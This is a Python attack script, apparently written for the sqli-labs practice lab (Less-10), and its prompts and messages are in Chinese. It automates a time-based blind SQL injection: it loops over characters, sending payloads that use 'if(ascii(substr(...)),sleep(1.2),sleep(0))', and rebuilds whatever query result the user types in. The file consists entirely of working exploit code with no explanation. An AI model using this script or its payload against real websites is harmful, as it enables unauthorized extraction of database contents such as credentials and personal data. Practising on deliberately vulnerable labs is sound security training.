import time 
import requests
url = "http://sql:8989/Less-10/"
result = ""
session=requests.Session()
a=input("输入注入命令：")
time1=time.time()
for i in range(1, 1000):
    found = False
    for n in range(32, 127):
        payload = f'?id=1" AND if(ascii(substr(({a}),{i},1))={n},sleep(1.2),sleep(0))--+'
        full_url = url + payload
        time_start = time.time()
        response = session.get(full_url)
        end_time = time.time()
        if end_time - time_start > 1.2:
            result += chr(n)
            print(result)
            found = True
            break
    if not found:
        print("获取完成，退出循环")
        break
time2=time.time()
print(f'共注入{len(result)}个字符')
print(f"注入耗时：{time2-time1:.2f}秒")
print(f'平均{(time2-time1)/len(result):.2f}秒/字符')